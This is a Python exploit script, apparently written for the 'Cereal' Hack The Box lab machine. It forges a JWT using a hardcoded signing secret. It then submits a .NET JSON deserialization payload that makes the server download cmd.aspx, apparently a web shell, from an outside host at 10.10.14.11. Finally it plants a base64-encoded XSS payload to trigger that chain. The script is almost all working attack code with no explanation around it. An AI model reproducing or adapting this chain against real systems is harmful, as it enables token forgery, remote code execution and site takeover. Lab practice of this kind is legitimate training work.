import requests
from urllib3.exceptions import InsecureRequestWarning
import time
import jwt
import base64

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Generating JWT Token
epoch = int(time.time())
expires = epoch + 86400
token = jwt.encode( {"unique_name":"1","nbf":1652548615,"exp":expires,"iat":epoch}, "secretlhfIH&FY*#oysuflkhskjfhefesf", algorithm="HS256" )
auth = { "Authorization": f"Bearer {token}" }

# Stage 1 - Send Deserialized Payload
payload = {"json": "{'$type': 'Cereal.DownloadHelper, Cereal', 'URL': 'http://10.10.14.11/cmd.aspx', 'FilePath': 'C:/inetpub/source/uploads/cmd.aspx' }"}

resp = requests.post("https://cereal.htb/requests", json=payload, headers=auth, verify=False)
resp = resp.json()
cereal_id = resp['id']
print(cereal_id)

# Stage 2 - Send XSS
js_payload = "var req = new XMLHttpRequest();"
js_payload += f"req.open('GET', 'https://cereal.htb/requests/{cereal_id}');"
js_payload += f"req.setRequestHeader('Authorization', 'Bearer {token}');"
js_payload += "req.send();"
js_payload = js_payload.encode()

b64_js_payload = base64.b64encode(js_payload).decode()

xss = {"json":f'{{ "title": "[XSS](javascript: eval%28atob%28%22{b64_js_payload}%22%29%29)", "flavor":"pizza", "color":"#FFF", "description":"test" }}'}

resp = requests.post("https://cereal.htb/requests", json=xss, headers=auth, verify=False)

print(xss)
print(js_payload)
print(resp.text)
